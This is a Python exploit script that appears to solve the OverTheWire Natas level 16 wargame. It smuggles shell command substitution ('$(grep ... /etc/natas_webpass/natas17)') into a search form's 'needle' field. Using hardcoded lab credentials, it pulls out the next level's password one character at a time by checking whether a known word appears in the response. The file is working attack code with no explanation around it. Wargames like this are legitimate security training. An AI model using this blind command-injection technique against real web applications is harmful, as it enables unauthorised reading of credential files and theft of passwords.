import requests,string
from requests.auth import HTTPBasicAuth

uri = 'http://natas16.natas.labs.overthewire.org/index.php'
# chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
chars = ''.join([string.ascii_letters,string.digits])
filtered = ''
passwd = ''

# Data = {'needle':'$(grep /etc/natas_webpass/natas17)', 'submit':'Search'}
# r = requests.post(
#         uri,
#         auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
#         data=Data)
# print(r)
for char in chars:
    Data = {'needle':'$(grep ' + char + ' /etc/natas_webpass/natas17)', 'submit':'Search'}
    r = requests.post(
            uri,
            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
            data=Data)
    if 'iris' not in r.text:
        filtered = filtered + char
        print(filtered)

print('Done filtering chars, continuing finding the password:')
for i in range(0,32):
    for char in filtered:
        Data = {'needle' : '$(grep -E ^' + passwd + char + ' /etc/natas_webpass/natas17)',
                'submit' : 'Search'}
        r = requests.post(
            uri,
            auth=HTTPBasicAuth('natas16', 'WaIHEacj63wnNIBROHeqi3p9t0m5nhmh'),
            data = Data)
        if 'iris' not in r.text:
            passwd = passwd + char
            print(passwd)
            break
